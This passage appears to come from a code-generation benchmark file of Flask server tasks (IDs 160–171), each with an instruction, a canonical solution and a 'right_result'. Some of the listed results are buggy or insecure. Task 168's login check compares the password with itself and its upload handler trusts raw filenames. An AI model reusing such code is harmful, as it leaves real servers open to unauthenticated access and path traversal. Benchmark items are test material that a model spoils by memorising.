768, 1024, 3 ], numpy.uint8) * 29, params=[ cv2.IMWRITE_JPEG_QUALITY, 80 ])[1].tobytes() + b'\\r\\n'; continue\n\t\t\t# end\n\n\t\t\tif objPlayback['intTime'] > len(objPlayback['fltTime']) - 1:\n\t\t\t\tobjPlayback['intTime'] = 0\n\t\t\t# end\n\n\t\t\tintTime = objPlayback['intTime']\n\t\t\tfltTime = objPlayback['fltTime'][intTime]\n\n\t\t\tif objPlayback['strMode'] == 'automatic':\n\t\t\t\tobjPlayback['intTime'] += 1\n\t\t\t# end\n\n\t\t\tif str(fltTime) not in objPlayback['strCache']:\n\t\t\t\tnpyKenburns = process_kenburns({\n\t\t\t\t\t'fltSteps': [ fltTime ],\n\t\t\t\t\t'objFrom': objPlayback['objFrom'],\n\t\t\t\t\t'objTo': objPlayback['objTo'],\n\t\t\t\t\t'boolInpaint': False\n\t\t\t\t})[0]\n\n\t\t\t\tobjPlayback['strCache'][str(fltTime)] = b'--frame\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n' + cv2.imencode(ext='.jpg', img=npyKenburns, params=[ cv2.IMWRITE_JPEG_QUALITY, 80 ])[1].tobytes() + b'\\r\\n'\n\t\t\t# end\n\n\t\t\tyield objPlayback['strCache'][str(fltTime)]\n\t\t# end\n\t# end\n\n\treturn flask.Response(response=generator(), mimetype='multipart/x-mixed-replace; boundary=frame')\n\n@objFlask.route(rule='/get_result', methods=[ 'GET' ])\ndef get_result():\n\tstrTempdir = tempfile.gettempdir() + '/kenburns-' + format(time.time(), '.6f') + '-' + str(os.getpid()) + '-' + str().join([random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for intCount in range(8)])\n\n\tos.makedirs(name=strTempdir + '/', exist_ok=False)\n\n\tnpyKenburns = process_kenburns({\n\t\t'fltSteps': numpy.linspace(0.0, 1.0, 75).tolist(),\n\t\t'objFrom': objPlayback['objFrom'],\n\t\t'objTo': objPlayback['objTo'],\n\t\t'boolInpaint': True\n\t})\n\n\tmoviepy.ImageSequenceClip(sequence=[ npyFrame[:, :, ::-1] for npyFrame in npyKenburns + list(reversed(npyKenburns))[1:-1] ], fps=25).write_videofile(strTempdir + '/kenburns.mp4')\n\n\tobjKenburns = io.BytesIO(open(strTempdir + '/kenburns.mp4', 'rb').read())\n\n\tshutil.rmtree(strTempdir + '/')\n\n\treturn flask.send_file(filename_or_fp=objKenburns, mimetype='video/mp4', as_attachment=True, attachment_filename='kenburns.mp4', cache_timeout=-1)\n\nif __name__ == '__main__':\n\tgevent.pywsgi.WSGIServer(listener=('0.0.0.0', 8080), application=objFlask).serve_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response, send_from_directory\nimport base64\nimport cv2\nimport numpy as np\nimport os\nimport gevent\nfrom gevent.pywsgi import WSGIServer\n\napp = Flask(__name__, static_folder='.', static_url_path='/')\napp.config['IMAGE_DIR'] = 'images'\n\ndef process_load(strFile, strData):\n    # Placeholder for image processing logic\n    return \"\"\n\ndef process_inpaint(image):\n    # Placeholder for inpainting logic\n    return image\n\ndef process_kenburns(image):\n    # Placeholder for kenburns effect logic\n    return image\n\n@app.route('/')\ndef index():\n    return app.send_static_file('index.html')\n\n@app.route('/load_image', methods=['POST'])\ndef load_image():\n    data = request.json\n    strFile = data.get('filename')\n    strData = data.get('imageData')\n    \n    if not strFile or not strData:\n        return \"\", 400\n    \n    try:\n        # Decode base64 image data\n        decoded_data = base64.b64decode(strData)\n        np_arr = np.frombuffer(decoded_data, np.uint8)\n        image = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)\n        \n        # Process image\n        processed_image = process_inpaint(image)\n        processed_image = process_kenburns(processed_image)\n        \n        # Save processed image\n        filename = os.path.join(app.config['IMAGE_DIR'], strFile)\n        cv2.imwrite(filename, processed_image)\n        \n        return process_load(strFile, strData)\n    except Exception as e:\n        return str(e), 500\n\n@app.route('/live')\ndef get_live():\n    def generate():\n        cap = cv2.VideoCapture(0)\n        while True:\n            ret, frame = cap.read()\n            if not ret:\n                break\n            _, buffer = cv2.imencode('.jpg', frame)\n            frame_str = base64.b64encode(buffer).decode('utf-8')\n            yield f'--frame\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n{frame_str}\\r\\n'\n    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')\n\n@app.route('/result')\ndef get_result():\n    video_path = 'processed_video.mp4'\n    return send_from_directory('.', video_path, as_attachment=True)\n\nif __name__ == '__main__':\n    http_server = WSGIServer(('0.0.0.0', 8080), app)\n    http_server.serve_forever()"
  },
  {
    "Task_id": 160,
    "Instruction": "Task Description: Create a custom Flask application class that extends the base Flask class to provide enhanced request handling and response generation capabilities, particularly for API responses.\n\nClass Description: FlaskApp is a subclass of Flask that customizes request handling and response generation. It provides automatic JSON serialization of responses and convenience methods for defining routes.\n\nAttributes:\n- request_class: [Request] - Custom request class to use for incoming requests\n- json_data_class: [tuple] - Tuple of classes that should be automatically converted to JSON responses\n\nMethods:\n- make_response(rv) -> Response - Overrides the base make_response method to automatically convert supported data types to JSON responses\n  Input: \n    rv: [Any] - The response value to process\n  Output:\n    Response object with appropriate content type and serialized data\n\n- get(rule, **options) -> decorator - Convenience method for creating GET routes\n  Input:\n    rule: [str] - URL rule as string\n    **options: [dict] - Additional options to pass to route()\n  Output:\n    Route decorator for GET method\n\n- post(rule, **options) -> decorator - Convenience method for creating POST routes\n  Input:\n    rule: [str] - URL rule as string\n    **options: [dict] - Additional options to pass to route()\n  Output:\n    Route decorator for POST method",
    "Canonical_solution": "from flask import Flask, Response\nfrom peewee import ModelSelect, Model\nfrom domain_admin.compat import Iterator\nfrom domain_admin.utils.flask_ext.api_result import ApiResult\nfrom domain_admin.utils.flask_ext.request import Request\nimport six\n\nclass FlaskApp(Flask):\n    request_class = Request\n\n    json_data_class = (\n        ModelSelect,\n        Model,\n        Iterator,\n        list,\n        dict,\n        six.integer_types,\n        six.text_type\n    )\n\n    def make_response(self, rv):\n        if isinstance(rv, self.json_data_class) or rv is None:\n            rv = ApiResult.success(rv)\n\n        if isinstance(rv, ApiResult):\n            return Response(rv.to_json(), content_type='application/json;charset=utf-8')\n\n        return super(FlaskApp, self).make_response(rv)\n\n    def get(self, rule, **options):\n        options.setdefault('methods', ['GET'])\n        return super(FlaskApp, self).route(rule, **options)\n\n    def post(self, rule, **options):\n        options.setdefault('methods', ['POST'])\n        return super(FlaskApp, self).route(rule, **options)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, Request, Response\nimport json\n\nclass FlaskApp(Flask):\n    def __init__(self, import_name, request_class=Request, json_data_class=None):\n        super().__init__(import_name)\n        self.request_class = request_class\n        self.json_data_class = json_data_class or (dict, list, tuple, str, int, float, bool)\n\n    def make_response(self, rv):\n        if isinstance(rv, self.json_data_class):\n            return Response(json.dumps(rv), mimetype='application/json')\n        return super().make_response(rv)\n\n    def get(self, rule, **options):\n        def decorator(f):\n            options['methods'] = ['GET']\n            return self.route(rule, **options)(f)\n        return decorator\n\n    def post(self, rule, **options):\n        def decorator(f):\n            options['methods'] = ['POST']\n            return self.route(rule, **options)(f)\n        return decorator"
  },
  {
    "Task_id": 162,
    "Instruction": "Task Description: Create a Flask-based API server that can handle multiple routes for status checking, input processing, and server management, with the ability to run in a separate thread or using a production server.\n\nClass Description: FlaskAPI is a class that encapsulates a Flask web server with custom routes for handling API requests. It provides methods to start and stop the server either in a development thread or using a production-ready server (Waitress).\n\nAttributes:\n- app: Flask - The Flask application instance\n- server_thread: ServerThread - Thread object for running the development server\n\nMethods:\n- __init__() -> None - Initializes the Flask application and sets up routes\n- _setup_routes() -> None - Defines the API endpoints and their handlers\n- _the_input(text: str, screen: str, talk: str) -> dict - Processes input text and optional screenshot, returns response\n- start_api(api: bool = False) -> None - Starts the server either in a thread (api=False) or using Waitress (api=True)\n- stop_api() -> None - Stops the running server thread\n\nNested Class: ServerThread\nClass Description: A thread class for running the Flask development server in a separate thread.\n\nAttributes:\n- srv: WSGIServer - The Werkzeug development server instance\n- ctx: AppContext - Flask application context\n\nMethods:\n- __init__(app: Flask, host: str, port: int) -> None - Initializes the server thread with Flask app and connection details\n- run() -> None - Starts the server and runs it indefinitely\n- shutdown() -> None - Stops the running server",
    "Canonical_solution": "from flask import Flask, request, jsonify\nimport threading\nfrom werkzeug.serving import make_server\nfrom waitress import serve\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.server_thread = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/status\", methods=[\"POST\"])\n        def status():\n            return jsonify({\"response\": True})\n\n        @self.app.route(\"/input\", methods=[\"POST\"])\n        def input():\n            data = request.json\n            text = data[\"text\"]\n            screen = data[\"screen\"]\n            talk = data[\"talk\"]\n            return self._the_input(text, screen, talk)\n\n        @self.app.route(\"/stop_server\", methods=[\"POST\"])\n        def stop_server():\n            self.stop_api()\n            exit(0)\n\n    def _the_input(self, text, screen, talk):\n        print(\"Input:\", text)\n        from .agent.process import process_text_api\n        from .utils.db import screenshot_path\n\n        if screen != \"true\":\n            result = process_text_api(text, None)\n        else:\n            import pyautogui\n            screenshot = pyautogui.screenshot()\n            screenshot.save(screenshot_path)\n            result = process_text_api(text, screenshot_path)\n\n        return jsonify({\"response\": result})\n\n    def start_api(self, api=False):\n        if api == False:\n            if self.server_thread is None:\n                self.server_thread = ServerThread(self.app, \"0.0.0.0\", 7541)\n                self.server_thread.start()\n                print(\"API started\")\n            else:\n                print(\"API is already running\")\n        else:\n            serve(self.app, host=\"0.0.0.0\", port=7541)\n\n    def stop_api(self):\n        if self.server_thread is not None:\n            self.server_thread.shutdown()\n            self.server_thread.join()\n            self.server_thread = None\n            print(\"API stopped\")\n        else:\n            print(\"API is not running\")\n\nclass ServerThread(threading.Thread):\n    def __init__(self, app, host, port):\n        threading.Thread.__init__(self)\n        self.srv = make_server(host, port, app)\n        self.ctx = app.app_context()\n        self.ctx.push()\n\n    def run(self):\n        print(\"Starting server\")\n        self.srv.serve_forever()\n\n    def shutdown(self):\n        print(\"Stopping server\")\n        self.srv.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport threading\nfrom waitress import serve\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.server_thread = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/status', methods=['GET'])\n        def status():\n            return jsonify({\"status\": \"running\", \"timestamp\": str(datetime.datetime.now())})\n\n        @self.app.route('/input', methods=['POST'])\n        def input_handler():\n            data = request.json\n            text = data.get('text', '')\n            screen = data.get('screen', '')\n            talk = data.get('talk', '')\n            response = self._the_input(text, screen, talk)\n            return jsonify(response)\n\n        @self.app.route('/stop', methods=['POST'])\n        def stop_server():\n            if hasattr(FlaskAPI, 'server_thread') and FlaskAPI.server_thread.is_alive():\n                FlaskAPI.server_thread.shutdown()\n            return jsonify({\"status\": \"stopped\"})\n\n    def _the_input(self, text: str, screen: str, talk: str) -> dict:\n        # Simulated processing of input\n        return {\n            \"response\": f\"Processed text: {text}, screen: {screen}, talk: {talk}\",\n            \"status\": \"success\"\n        }\n\n    def start_api(self, api: bool = False):\n        if not api:\n            self.server_thread = threading.Thread(target=self._run_dev_server)\n            self.server_thread.start()\n        else:\n            serve(self.app, host='0.0.0.0', port=5000)\n\n    def stop_api(self):\n        if hasattr(FlaskAPI, 'server_thread') and FlaskAPI.server_thread.is_alive():\n            FlaskAPI.server_thread.shutdown()\n\n    def _run_dev_server(self):\n        with self.app.app_context():\n            self.app.run(host='0.0.0.0', port=5000)\n\nclass ServerThread(threading.Thread):\n    def __init__(self, app: Flask, host: str, port: int):\n        super().__init__()\n        self.srv = None\n        self.ctx = app.app_context()\n        self.app = app\n        self.host = host\n        self.port = port\n\n    def run(self):\n        self.ctx.push()\n        try:\n            self.srv = self.app.run(host=self.host, port=self.port)\n        finally:\n            self.ctx.pop()\n\n    def shutdown(self):\n        if self.srv:\n            self.srv.stop()"
  },
  {
    "Task_id": 163,
    "Instruction": "Task Description: Create a Flask-based web service that accepts POST requests with form data, processes the data using a pre-trained machine learning model, and returns a prediction result rendered in an HTML template.\n\nFunction Description: The `predict` function is a Flask route handler that processes incoming POST requests containing form data. It extracts the input values, converts them to a format suitable for the machine learning model, makes a prediction, and returns the result embedded in an HTML template.\n\nInput: \n- The function receives form data via Flask's request object (implicit input through `request.form.values()`)\n- The form data should contain numerical values that can be converted to floats\n\nOutput:\n- Returns a rendered HTML template ('index.html') with the prediction result embedded in the template variable `prediction_text`\n- The output is a string containing the prediction percentage formatted as \"Percent with heart disease is X.XX\" where X.XX is the rounded prediction value",
    "Canonical_solution": "import numpy as np\nfrom flask import Flask, request, render_template\nimport pickle\n\napp = Flask(__name__)\nmodel = pickle.load(open('models/model.pkl', 'rb'))\n\n@app.route('/predict',methods=['POST'])\ndef predict():\n    int_features = [float(x) for x in request.form.values()]\n    features = [np.array(int_features)]\n    prediction = model.predict(features)\n    output = round(prediction[0], 2)\n    return render_template('index.html', prediction_text='Percent with heart disease is {}'.format(output))\n\nif __name__ == \"__main__\":\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\nimport numpy as np\n\napp = Flask(__name__)\n\n# Example pre-trained model (replace with actual model)\nclass PredictModel:\n    def predict(self, input_data):\n        # Simulate a prediction\n        return np.random.rand() * 100\n\nmodel = PredictModel()\n\n@app.route('/', methods=['POST'])\ndef predict():\n    # Extract form data\n    input_values = [float(val) for val in request.form.values()]\n    \n    # Process input (example: use as is)\n    input_array = np.array(input_values).reshape(1, -1)\n    \n    # Make prediction\n    prediction = model.predict(input_array)\n    prediction_text = f\"Percent with heart disease is {prediction:.2f}\"\n    \n    # Render HTML template with prediction result\n    return render_template('index.html', prediction_text=prediction_text)\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 165,
    "Instruction": "Task Description: Create a Flask-based HTTP server class for handling ONNX model modification requests, including opening models, applying modifications, and providing download functionality.\n\nClass Description: ONNXModifierServer is a Flask application wrapper that provides endpoints for uploading ONNX models, modifying them, and downloading the modified versions. It maintains the model state between requests and handles file operations.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- onnx_modifier: [onnxModifier|None] - The current ONNX model being processed (None when no model loaded)\n\nMethods:\n- __init__: [constructor]() -> [None] - Initializes the Flask app and sets up routes\n- _setup_routes: [method]() -> [None] - Configures URL routes and their handler methods\n- index: [method]() -> [str] - Returns the main HTML interface (renders index.html template)\n- open_model: [method]() -> [tuple[str, int]] - Handles file upload, creates onnxModifier instance from uploaded file (expects 'file' in request.files)\n- modify_and_download_model: [method]() -> [str] - Applies modifications from JSON request (request.get_json()), saves model, returns save path\n- run: [method](host: str='127.0.0.1', port: int=5000, debug: bool=False) -> [None] - Starts the Flask development server with specified parameters",
    "Canonical_solution": "from flask import Flask, request, render_template\n\nclass ONNXModifierServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.onnx_modifier = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.add_url_rule('/', 'index', self.index)\n        self.app.add_url_rule('/open_model', 'open_model', self.open_model, methods=['POST'])\n        self.app.add_url_rule('/download', 'modify_and_download_model', self.modify_and_download_model, methods=['POST'])\n\n    def index(self):\n        return render_template('index.html')\n\n    def open_model(self):\n        onnx_file = request.files['file']\n        self.onnx_modifier = onnxModifier.from_name_protobuf_stream(\n            onnx_file.filename, onnx_file.stream)\n        return 'OK', 200\n\n    def modify_and_download_model(self):\n        modify_info = request.get_json()\n        self.onnx_modifier.reload()\n        self.onnx_modifier.modify(modify_info)\n        save_path = self.onnx_modifier.check_and_save_model()\n        return save_path\n\n    def run(self, host='127.0.0.1', port=5000, debug=False):\n        self.app.run(host=host, port=port, debug=debug)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template, send_file\nimport onnx\nimport os\n\nclass ONNXModifierServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.onnx_modifier = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/')\n        def index():\n            return render_template('index.html')\n\n        @self.app.route('/open_model', methods=['POST'])\n        def open_model():\n            file = request.files['file']\n            if file:\n                temp_path = 'temp_model.onnx'\n                file.save(temp_path)\n                self.onnx_modifier = onnx.load(temp_path)\n                return f\"Model loaded successfully. Path: {temp_path}\", 200\n            return \"No file uploaded\", 400\n\n        @self.app.route('/modify_and_download', methods=['POST'])\n        def modify_and_download_model():\n            data = request.get_json()\n            if not data or 'modifications' not in data:\n                return \"Invalid request data\", 400\n\n            # Apply modifications (this is a placeholder for actual modification logic)\n            modified_model = self.onnx_modifier\n            save_path = 'modified_model.onnx'\n            onnx.save(modified_model, save_path)\n            return send_file(save_path, as_attachment=True)\n\n        @self.app.route('/download_model', methods=['GET'])\n        def download_model():\n            save_path = 'modified_model.onnx'\n            if os.path.exists(save_path):\n                return send_file(save_path, as_attachment=True)\n            return \"Model not found\", 404\n\n    def run(self, host='127.0.0.1', port=5000, debug=False):\n        self.app.run(host=host, port=port, debug=debug)"
  },
  {
    "Task_id": 166,
    "Instruction": "Task Description: Create a Flask-based HTTP server that implements a GraphQL endpoint with both GET and POST methods, including a GraphiQL playground interface for testing queries.\n\nFunction Description: The code implements two Flask route handlers for a GraphQL server. The first handles GET requests to serve a GraphiQL playground interface, while the second handles POST requests to process GraphQL queries and mutations.\n\nInput:\n- For GET /graphql: No input parameters (uses Flask's request object internally)\n- For POST /graphql: Expects JSON payload containing GraphQL query/mutation\n\nOutput:\n- For GET /graphql: Returns HTML content for GraphiQL playground (status 200)\n- For POST /graphql: Returns JSON response containing either:\n  - Successful query result (status 200)\n  - Error response (status 400) if query fails",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom ariadne import graphql_sync\nfrom ariadne.explorer import ExplorerGraphiQL\n\napp = Flask(__name__)\napp.config.update(\n    {\n        \"TESTING\": True,\n    }\n)\n\nexplorer = ExplorerGraphiQL(title=\"My Flask GraphQL\")\n\n@app.route(\"/graphql\", methods=[\"GET\"])\ndef graphql_playground():\n    html = explorer.html(request)\n    return html, 200\n\n@app.route(\"/graphql\", methods=[\"POST\"])\ndef graphql_server():\n    data = request.get_json()\n    success, result = graphql_sync(\n        schema,\n        data,\n        context_value={\"request\": request},\n        root_value={\"hello\": \"Hello Flask!\"},\n        debug=app.debug,\n    )\n    status_code = 200 if success else 400\n    return jsonify(result), status_code",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, render_template\nfrom flask_graphiql import GraphiQLView\nimport graphene\n\napp = Flask(__name__)\n\nclass Query(graphene.ObjectType):\n    hello = graphene.String()\n\n    def resolve_hello(self, info):\n        return \"Hello, world!\"\n\nschema = graphene.Schema(query=Query)\n\n@app.route('/graphql', methods=['GET'])\ndef get_graphiql():\n    return GraphiQLView().render()\n\n@app.route('/graphql', methods=['POST'])\ndef post_graphql():\n    data = request.json\n    result = schema.execute(data['query'], context=request)\n    if result.errors:\n        return jsonify(errors=[str(e) for e in result.errors]), 400\n    return jsonify(data=result.data), 200\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 168,
    "Instruction": "Task Description: Create a Flask-based HTTP server application that serves files from a specified directory, handles file uploads, and implements basic authentication. The server should support both directory browsing and file downloads, with optional SSL encryption.\n\nFunction Description: The function `create_flask_app` initializes and runs a Flask web server with the following capabilities:\n1. Serves files from a specified directory with directory browsing\n2. Handles file uploads to valid subdirectories\n3. Implements HTTP Basic Authentication\n4. Supports optional SSL encryption\n5. Handles permission errors gracefully\n\nInput:\n- directory: [str] - The root directory to serve files from\n- port: [int] - The port number to run the server on\n- password: [str] - The password for HTTP Basic Authentication\n- ssl: [bool] - Whether to enable SSL encryption\n\nOutput: None (The function runs the server indefinitely until interrupted)\n\nMethods:\n- home(path): Handles requests for files and directories\n  Input: path [str] - The requested file/directory path\n  Output: Flask response (file download, directory listing, or redirect)\n  \n- upload(): Handles file uploads via POST requests\n  Input: None (uses Flask's request object)\n  Output: Flask redirect response\n  \n- verify_password(username, password): Verifies HTTP Basic Authentication credentials\n  Input: \n    username [str] - The username (ignored in this implementation)\n    password [str] - The password to verify\n  Output: [bool] - True if authentication succeeds, False otherwise",
    "Canonical_solution": "from flask import Flask, render_template, send_file, redirect, request, send_from_directory, url_for, abort\nfrom flask_httpauth import HTTPBasicAuth\nfrom werkzeug.utils import secure_filename\nfrom werkzeug.security import generate_password_hash, check_password_hash\nfrom werkzeug.serving import run_simple\n\ndef create_flask_app(directory, port, password, ssl):\n    app = Flask(__name__)\n    auth = HTTPBasicAuth()\n\n    @app.route('/', defaults={'path': None})\n    @app.route('/<path:path>')\n    @auth.login_required\n    def home(path):\n        if path and is_valid_subpath(path, directory):\n            path = os.path.normpath(path)\n            requested_path = os.path.join(directory, path)\n\n            if os.path.isdir(requested_path):\n                back = get_parent_directory(requested_path, directory)\n                is_subdirectory = True\n            elif os.path.isfile(requested_path):\n                if request.args.get('view') is None:\n                    send_as_attachment = True\n                else:\n                    send_as_attachment = False\n\n                (filename, extension) = os.path.splitext(requested_path)\n                if extension == '':\n                    mimetype = 'text/plain'\n                else:\n                    mimetype = None\n\n                try:\n                    return send_file(requested_path, mimetype=mimetype, as_attachment=send_as_attachment)\n                except PermissionError:\n                    abort(403, 'Read Permission Denied: ' + requested_path)\n        else:\n            is_subdirectory = False\n            requested_path = directory\n            back = ''\n\n        if os.path.exists(requested_path):\n            try:\n                directory_files = process_files(os.scandir(requested_path), directory)\n            except PermissionError:\n                abort(403, 'Read Permission Denied: ' + requested_path)\n\n            return render_template('home.html', files=directory_files, back=back,\n                                 directory=requested_path, is_subdirectory=is_subdirectory, version=VERSION)\n        else:\n            return redirect('/')\n\n    @app.route('/upload', methods=['POST'])\n    @auth.login_required\n    def upload():\n        if request.method == 'POST':\n            if 'file' not in request.files:\n                return redirect(request.referrer)\n\n            path = request.form['path']\n            if not is_valid_upload_path(path, directory):\n                return redirect(request.referrer)\n\n            for file in request.files.getlist('file'):\n                if file.filename == '':\n                    return redirect(request.referrer)\n\n                if file:\n                    filename = secure_filename(file.filename)\n                    full_path = os.path.join(path, filename)\n                    try:\n                        file.save(full_path)\n                    except PermissionError:\n                        abort(403, 'Write Permission Denied: ' + full_path)\n\n            return redirect(request.referrer)\n\n    users = {\n        '': generate_password_hash(password)\n    }\n\n    @auth.verify_password\n    def verify_password(username, password):\n        if password:\n            if username in users:\n                return check_password_hash(users.get(username), password)\n            return False\n        else:\n            return True\n\n    ssl_context = 'adhoc' if ssl else None\n    run_simple(\"0.0.0.0\", int(port), app, ssl_context=ssl_context)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "def create_flask_app(directory, port, password, ssl):\n    from flask import Flask, request, redirect, send_from_directory, abort\n    from functools import wraps\n    import os\n\n    app = Flask(__name__)\n\n    def authenticate(username, password):\n        return password == password\n\n    def login_required(f):\n        @wraps(f)\n        def decorated_function(*args, **kwargs):\n            auth = request.authorization\n            if not auth or not authenticate(auth.username, auth.password):\n                return redirect('https://login.example.com')\n            return f(*args, **kwargs)\n        return decorated_function\n\n    @app.route('/<path:path>')\n    @login_required\n    def home(path):\n        full_path = os.path.join(directory, path)\n        if os.path.isdir(full_path):\n            return send_from_directory(directory, path, conditional=True)\n        else:\n            return send_from_directory(directory, path)\n\n    @app.route('/upload', methods=['POST'])\n    @login_required\n    def upload():\n        file = request.files['file']\n        if file:\n            filename = file.filename\n            file.save(os.path.join(directory, filename))\n            return redirect('/')\n        return 'No file uploaded', 400\n\n    if ssl:\n        app.run(host='0.0.0.0', port=port, ssl_context=('cert.pem', 'key.pem'))\n    else:\n        app.run(host='0.0.0.0', port=port)"
  },
  {
    "Task_id": 169,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles QR code generation, status checking, and token retrieval for an authentication system.\n\nFunction Description: The server provides three main endpoints: one to display a main page with QR code, one to generate QR code URLs, one to check QR code status, and one to retrieve authentication tokens.\n\nInput:\n- For '/get_qrcode' endpoint: GET request with no parameters\n- For '/check_qrcode/<sid>' endpoint: GET request with sid (session ID) as URL parameter\n- For '/get_tokens' endpoint: POST request with JSON body containing auth_code\n\nOutput:\n- '/get_qrcode': Returns JSON with QR code URL data\n- '/check_qrcode/<sid>': Returns JSON with QR code status\n- '/get_tokens': Returns JSON with status confirmation after processing auth_code",
    "Canonical_solution": "import time\nimport logging\nimport json\nimport uuid\nimport hashlib\nimport base64\nimport random\nimport sys\nimport requests\nfrom flask import Flask, jsonify, render_template, request\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\napp = Flask(__name__)\ntimestamp = str(requests.get('http://api.extscreen.com/timestamp', timeout=10).json()['data']['timestamp'])\nunique_id = uuid.uuid4().hex\nwifimac = str(random.randint(10**11, 10**12 - 1))\nheaders = {\n    \"token\": \"6733b42e28cdba32\",\n    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 9; zh-cn; SM-S908E Build/TP1A.220624.014) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1',\n    'Host': 'api.extscreen.com'\n}\n\n@app.route('/')\ndef main_page():\n    return render_template('qrcode.html')\n\n@app.route('/get_qrcode', methods=['GET'])\ndef get_qrcode():\n    return jsonify(get_qrcode_url())\n\n@app.route('/check_qrcode/<sid>', methods=['GET'])\ndef check_qrcode(sid):\n    return jsonify(check_qrcode_status(sid))\n\n@app.route('/get_tokens', methods=['POST'])\ndef get_tokens():\n    _auth_code = request.json.get('auth_code')\n    get_token(_auth_code)\n    return jsonify({'status': 'completed'})",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, jsonify, request\nimport qrcode\nimport uuid\nimport time\n\napp = Flask(__name__)\n\n# Simulated database for QR code status\nqr_status = {}\n\n@app.route('/get_qrcode')\ndef get_qrcode():\n    # Generate a unique session ID\n    sid = str(uuid.uuid4())\n    # Generate QR code URL (simulated)\n    qr_url = f\"https://example.com/qr/{sid}\"\n    # Store the session ID and timestamp in the simulated database\n    qr_status[sid] = {'status': 'pending', 'timestamp': time.time()}\n    return jsonify({'qr_url': qr_url, 'session_id': sid})\n\n@app.route('/check_qrcode/<sid>')\ndef check_qrcode(sid):\n    if sid not in qr_status:\n        return jsonify({'error': 'Invalid session ID'})\n    status = qr_status[sid]['status']\n    timestamp = qr_status[sid]['timestamp']\n    return jsonify({'session_id': sid, 'status': status, 'timestamp': timestamp})\n\n@app.route('/get_tokens', methods=['POST'])\ndef get_tokens():\n    data = request.get_json()\n    auth_code = data.get('auth_code')\n    if not auth_code:\n        return jsonify({'error': 'Missing auth_code'}), 400\n    # Simulate processing of auth code\n    time.sleep(2)  # Simulate delay\n    return jsonify({'status': 'success', 'message': 'Tokens retrieved successfully'})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 171,
    "Instruction": "Task Description: Create a Flask-based HTTP server for Text-to-Speech (TTS) processing that handles multiple API endpoints for TTS generation, batch processing, and progress tracking.\n\nClass Description: FlaskTTSAPI is a Flask application wrapper that provides TTS functionality through HTTP endpoints. It manages TTS requests, batch processing of text files, and progress tracking for long-running tasks.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- chuliing: [dict] - Tracks progress of batch processing tasks with keys 'name' (current file), 'line' (current line), and 'end' (completion status)\n\nMethods:\n- __init__() -> [None] - Initializes the Flask app, sets up routes and logging\n- _setup_logging() -> [None] - Configures logging with file rotation\n- _setup_routes() -> [None] - Defines all API endpoints and their handler methods\n- apitts() -> [flask.Response] - Handles single TTS requests. Returns JSON with either the generated audio file or an error message\n- ttslistjindu() -> [flask.Response] - Returns current progress of batch processing as JSON\n- ttslist() -> [flask.Response] - Initiates batch processing of text files. Returns immediate acknowledgment\n- detail_task(voice: str, src: str, dst: str, speed: float, language: str) -> [None] - Background task for processing text files into TTS audio\n- run() -> [None] - Starts the WSGI server to handle HTTP requests\n\nInput:\n- For apitts(): HTTP POST with form data containing 'text', 'language', and either 'voice' or 'audio' file\n- For ttslist(): HTTP POST with form data containing 'voice', 'src' (source dir), 'dst' (destination dir), 'speed', and 'language'\n- For ttslistjindu(): HTTP GET request to check progress\n\nOutput:\n- JSON responses containing either:\n  - Success: {'code': 0, 'url': [generated_audio_url]} or {'code': 0, 'msg': 'ok'}\n  - Error: {'code': 1 or 2, 'msg': [error_description]}\n  - Progress: {'name': [current_file], 'line': [current_line], 'end': [True/False]}",
